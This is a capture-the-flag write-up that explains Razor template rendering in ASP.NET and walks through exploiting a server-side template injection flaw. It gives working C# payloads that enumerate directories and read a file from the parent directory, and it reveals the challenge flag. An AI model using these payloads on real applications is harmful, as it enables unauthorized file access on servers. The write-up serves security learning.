# Writeup

## Step 1 – Initial Test

Attempted to inject JavaScript code into different text boxes.

## Step 2 – Discovery

From the error messages after JavaScript injection, identified that the application uses the Razor template engine (ASP.NET).

A template engine is a system that takes a template (an HTML page with placeholders, logic, or variables) and combines it with data on the server-side to produce the final HTML that gets sent to the client’s browser.

For example:

```html
<p>Hello, @username!</p>
```

If `username = "Alice"`, the Razor engine generates:

```html
<p>Hello, Alice!</p>
```

The browser does not *request a template* directly:
It makes a standard **HTTP request** (GET or POST) to an application URL (`/profile`, `/dashboard`, `/print?id=123`, etc.).

This request can contain:
- Query string parameters (`?id=123`)
- POST parameters (from a form, e.g. `username=Alice&password=...`)
- Cookies / session ID (to identify the logged-in user)

What happens on the server side:

- The request reaches the ASP.NET framework.
- The routing system decides which controller action (in MVC) or which Razor Page (in Razor Pages) should handle the request, based on the URL.
- The controller or page reads the data from the request (query string, form, cookies, database).
- This data becomes variables in `C#` (e.g. `ViewBag.Username = "Alice";`).
- The controller (MVC) explicitly calls return View(); or return View("CustomView");, which determines which .cshtml file will be used.
 - By convention, return View(); looks for a `.cshtml` file that matches the action name inside the corresponding `Views/ControllerName/` folder.
 - With Razor Pages, the URL maps directly to a `.cshtml` file under `Pages/`.
- The Razor engine takes the `.cshtml` template, which contains markup + placeholders (`@username`, `@DateTime.Now`, etc.).
- Razor translates the template into pure C#, compiles it, and executes it.
- The final result is static HTML with the values already replaced → returned as the HTTP response to the client.


## Step 3 – Server-Side Template Injection (SSTI)
Discovered that it was possible to inject `C#` code directly into the Razor template.

Since Razor processes templates on the server-side, any injected `C#` expression (e.g. `@(2+2)`) is evaluated by the Razor engine before the response is sent to the client.
Example:

```csharp
@(2+2)
```

is rendered by the server as:

```
4
```

This confirms a **Server-Side Template Injection (SSTI)** vulnerability: the attacker's input is executed as part of the template compilation, effectively giving code execution within the Razor context.

## Step 4 – Directory Enumeration
Listed files in the current working directory with:

```csharp
@(System.String.Join(" | ", System.IO.Directory.GetFiles(".")))
```


## Step 5 – Exploring Parent Directory

Discovered the `user.txt` file in the parent directory.

## Step 6 – Reading the Flag
Retrieved the flag using:

```C#
@(System.IO.File.ReadAllText("../user.txt"))
```

## Flag
```
brunner{m0R3_l1K3_r3c1P3_1NJ3ct1On!}
```